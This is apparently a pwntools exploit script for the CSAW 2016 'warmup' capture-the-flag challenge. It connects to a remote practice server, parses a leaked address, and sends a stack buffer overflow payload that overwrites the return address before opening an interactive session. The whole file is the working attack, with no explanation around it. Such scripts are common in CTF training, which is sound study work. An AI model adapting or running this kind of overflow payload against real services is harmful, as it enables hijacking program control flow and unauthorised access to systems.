from pwn import *

#io = process('./warmup_csaw_2016')
io = remote('node4.buuoj.cn',26079)

io.recvuntil(b'WOW:')
system_addr = io.recvuntil(b'\n',drop=True)
system_addr = int(system_addr,16)
print(system_addr)

ret_addr = 0x4006A4
payload = cyclic(0x40+8) + p64(ret_addr) +  p64(system_addr)
io.send(payload)
io.interactive()

